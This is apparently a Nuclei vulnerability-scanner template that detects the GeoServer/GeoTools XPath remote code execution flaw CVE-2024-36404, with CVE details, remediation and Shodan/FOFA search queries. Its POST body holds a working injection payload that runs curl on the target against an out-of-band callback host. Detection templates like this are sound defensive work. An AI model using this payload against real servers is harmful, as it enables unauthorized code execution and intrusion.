flow: http(1) && http(2)
http:
- extractors:
  - internal: true
    name: featuretype
    type: xpath
    xpath:
    - /wfs:WFS_Capabilities/FeatureTypeList/FeatureType[1]/Name
  matchers:
  - condition: and
    dsl:
    - contains(body, "wfs:WFS_Capabilities")
    - contains(content_type, "application/xml")
    - status_code == 200
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/geoserver/wfs?service=WFS&request=GetCapabilities'
  - '{{BaseURL}}/geoserver/ows?service=WFS&request=GetCapabilities'
  - '{{BaseURL}}/wfs?service=WFS&request=GetCapabilities'
  - '{{BaseURL}}/ows?service=WFS&request=GetCapabilities'
  stop-at-first-match: true
- body: "<wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'>\n\
    \  <wfs:Query typeNames='{{featuretype}}'/>\n  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'curl\
    \ {{interactsh-url}}')</wfs:valueReference>\n</wfs:GetPropertyValue>\n"
  headers:
    Content-Type: application/xml
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    - contains(body, "java.lang.ClassCastException")
    - contains(content_type, "application/xml")
    - status_code == 400
    type: dsl
  method: POST
  path:
  - '{{BaseURL}}/geoserver/wfs?service=WFS'
  - '{{BaseURL}}/geoserver/ows?service=WFS'
  - '{{BaseURL}}/wfs?service=WFS'
  - '{{BaseURL}}/ows?service=WFS'
  stop-at-first-match: true
id: CVE-2024-36404
info:
  author: ritikchaddha,darses
  classification:
    cve-id: CVE-2024-36404
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-95
    epss-percentile: 0.9957
    epss-score: 0.90268
  description: 'GeoTools is an open source Java library that provides tools for geospatial
    data. Prior to versions 31.2, 30.4, and 29.6, Remote Code Execution (RCE) is possible
    if an application uses certain GeoTools functionality to evaluate XPath expressions
    supplied by user input. Versions 31.2, 30.4, and 29.6 contain a fix for this issue.
    As a workaround, GeoTools can operate with reduced functionality by removing the
    `gt-complex` jar from one''s application. As an example of the impact, application
    schema `datastore` would not function without the ability to use XPath expressions
    to query complex content. Alternatively, one may utilize a drop-in replacement
    GeoTools jar from SourceForge for versions 31.1, 30.3, 30.2, 29.2, 28.2, 27.5,
    27.4, 26.7, 26.4, 25.2, and 24.0. These jars are for download only and are not
    available from maven central, intended to quickly provide a fix to affected applications.

    '
  impact: 'Unauthenticated attackers can execute arbitrary code remotely via XPath
    expression exploitation in GeoTools functionality.

    '
  metadata:
    fofa-query:
    - title="geoserver"
    - app="geoserver"
    - icon_hash="97540678"
    - body="/geoserver/"
    max-request: 8
    product: geoserver
    shodan-query:
    - title:"geoserver"
    - 'http.html_hash:1093634893 "Content-Disposition: inline"'
    - http.favicon.hash:97540678
    - html:"/geoserver/"
    vendor: osgeo
    verified: true
  name: GeoServer and GeoTools - Remote Code Execution
  reference:
  - https://nsfocusglobal.com/remote-code-execution-vulnerability-between-geoserver-and-geotools-cve-2024-36401-cve-2024-36404-notification/
  - https://geoserver.org/vulnerability/2024/09/12/cve-2024-36401.html
  - https://nvd.nist.gov/vuln/detail/CVE-2024-36404
  remediation: 'Update GeoServer and GeoTools to versions 31.2, 30.4, or 29.6 or later.

    '
  severity: critical
  tags: cve,cve2024,geoserver,rce,vuln
